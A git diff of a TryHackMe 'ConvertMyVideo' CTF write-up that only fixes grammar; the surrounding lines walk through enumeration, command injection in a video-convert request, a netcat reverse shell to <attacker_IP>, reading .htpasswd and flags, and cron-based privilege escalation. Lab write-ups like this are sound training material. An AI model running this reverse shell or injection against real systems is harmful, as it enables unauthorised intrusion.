@@ -10,7 +10,7 @@ tags: ctf
 You can convert your videos - Why don't you check it out!
 <!-- readmore -->
 
-There is only one task, indicating that we have to get four information. So without any further ado, let's begin our game!
+There is only one task, indicating that we have to get four pieces of information. So without any further ado, let's begin our game!
 
 > TryHackMe CTF Room: <https://tryhackme.com/room/convertmyvideo>
 
@@ -44,7 +44,7 @@ Well, it seems we have only two open ports: `22 (SSH)` and `80 (HTTP)`.
 
 ## Web Directories Enumeration
 
-Let's start by visiting the homepage of the web server listening on port 80. Although, by inspecting the source page it seems that there is nothing interesting.
+Let's start by visiting the homepage of the web server that listens on port 80. Although, by inspecting the source page it seems that nothing is interesting.
 
 ### Gobuster
 
@@ -82,7 +82,7 @@ We got the **first answer**: the name of the secret folder is `***secret_folder*
 
 ## Analyse HTTP Traffic
 
-Since we can't access the pages we found using Gobuster, we can try to analyse and intercepting the HTTP request triggered by clicking the "Convert" button. For this purposes, we can use BurpSuite (or any other equivalent proxy-based tools).
+Since we can't access the pages we found using Gobuster, we can try to analyse and intercept the HTTP request triggered by clicking the "Convert" button. For this purpose, we can use BurpSuite (or any other equivalent proxy-based tool).
 
 Let's try to convert a non-existent video with *ID 23423* and send the request to Repeater:
 
@@ -142,14 +142,14 @@ Bingo! The response returned `"output":"uid=33(www-data) gid=33(www-data) groups
 
 ## Remote Code Execution (RCE)
 
-We can now try to execute a reverse shell. There are several ways to do that, in this case we can opt for a simple netcat reverse shell. Let's write it down in a file:
+We can now try to execute a reverse shell. There are several ways to do that, in this case, we can opt for a simple netcat reverse shell. Let's write it down in a file:
 
 ```sh
 #!/bin/bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_IP> 4444 >/tmp/f
 ```
 
-Now we have to upload the file to the remote machine. In order to do such thing, we can simply run a Python server and download the file from the remote machine:
+Now we have to upload the file to the remote machine. To do such a thing, we can simply run a Python server and download the file from the remote machine:
 
 ```sh
 attacker@machine:~$ python3 -m http.server 4343
@@ -224,7 +224,7 @@ www-data@dmv:/var/www/html$ cat ***secret_folder***/.htpasswd
 ***user***:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
 ```
 
-As a matter of fact, thanks to the reverse shell we killed two birds with a stone since we can also retrieve the **user flag**:
+Thanks to the reverse shell we killed two birds with a stone since we can also retrieve the **user flag**:
 
 ```sh
 www-data@dmv:/var/www/html$ cat ***secret_folder***/flag.txt
@@ -233,14 +233,14 @@ www-data@dmv:/var/www/html$ cat ***secret_folder***/flag.txt
 
 ## Privilege Escalation
 
-In order to get the root flag we have to elevate our privileges. If we go back to the directories enumeration step, we had found the `/tmp`. By looking inside it, we can discover a script called `clean.sh`:
+To get the root flag we have to elevate our privileges. If we go back to the directories enumeration step, we had found the `/tmp`. By looking inside it, we can discover a script called `clean.sh`:
 
 ```sh
 www-data@dmv:/var/www/html$ cat tmp/clean.sh
 rm -rf downloads
 ```
 
-It could be a cron job, as the aim of the script would suggest. We can investigate about it by using [pspy](https://github.com/DominicBreuker/pspy). So let's upload it to the remote machine and execute it:
+It could be a cron job, as the aim of the script would suggest. We can investigate it by using [pspy](https://github.com/DominicBreuker/pspy). So let's upload it to the remote machine and execute it:
 
 ```sh
 www-data@dmv:/var/www/html$ ./pspy64s
